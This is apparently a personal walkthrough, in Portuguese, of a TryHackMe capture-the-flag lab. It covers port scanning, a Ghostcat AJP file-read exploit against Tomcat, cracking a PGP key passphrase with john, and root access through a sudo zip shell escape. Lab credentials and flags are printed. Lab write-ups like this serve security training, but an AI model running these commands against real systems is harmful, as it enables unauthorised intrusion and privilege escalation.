# nmap

nmap -T4 10.67.179.33       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 11:10 -0400
Nmap scan report for 10.67.179.33 (10.67.179.33)
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds

nmap -sV -sC -p22,53,8009,8080 10.67.179.33
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 11:11 -0400
Nmap scan report for 10.67.179.33 (10.67.179.33)
Host is up (0.14s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
                                                                    

## gobuster

tomcat server

http://10.67.179.33:8080/

só 403 em tudo de manage ou segurança

enumarete também não trouxe nada

└─$ gobuster dir -u http://10.67.179.33:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.179.33:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
docs                 (Status: 302) [Size: 0] [--> /docs/]
examples             (Status: 302) [Size: 0] [--> /examples/]
favicon.ico          (Status: 200) [Size: 21630]
host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================


## apj13

expoe um serviço que é vulnerável a CVE-2020–1938

o script em python para exploit https://github.com/00theway/Ghostcat-CNVD-2020-10487

roda-se o script com o comando

python3 script.py http://10.67.179.33:8080/ 8009 /WEB-INF/web.xml read

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>

extraimos o user e senha

skyfuck:
8730281lkjlkjdqlksalks

## ssh to server

ssh skyfuck@10.67.179.33

skyfuck@ubuntu:~$ ls -latr
total 40
drwxr-xr-x 4 root    root    4096 Mar 10  2020 ..
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10  2020 .profile
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10  2020 .bashrc
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10  2020 .bash_logout
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10  2020 credential.pgp
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10  2020 tryhackme.asc
-rw------- 1 skyfuck skyfuck  136 Mar 10  2020 .bash_history
drwx------ 2 skyfuck skyfuck 4096 Oct 29 08:21 .cache
drwxr-xr-x 3 skyfuck skyfuck 4096 Oct 29 08:21 .


dois arquivos 
credential.pgp encriptado
tryhackme.asc chave privada

salvar localmente a chave privada

## john the reaper

converter a chave para hash do john

└─$ gpg2john tryhackme.asc > hash_private_key.txt                                                   

at hash_private_key.txt 
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

usar o john com base no rockyou

john hash_private_key.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2026-10-29 11:26) 20.00g/s 21440p/s 21440c/s 21440C/s chinita..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

senha
alexandru

## descriptografar credenciais
importar a chave privada:
gpg --import tryhackme.asc

gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

rodar a descriptografia:
skyfuck@ubuntu:~$ gpg -d credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$ 

user e senha
merlin
asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

## ssh para o merlin
ssh merlin@10.67.179.33

cat user.txt

THM{GhostCat_1s_so_cr4sy}

## Escalar privilégio

com o sudo -l
sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

pode usar o zip conforme GTFObins

sudo /usr/bin/zip /home/merlin/temp.txt /etc/hosts -T -TT '/bin/sh #'

cd /root
cat root.txt

THM{Z1P_1S_FAKE}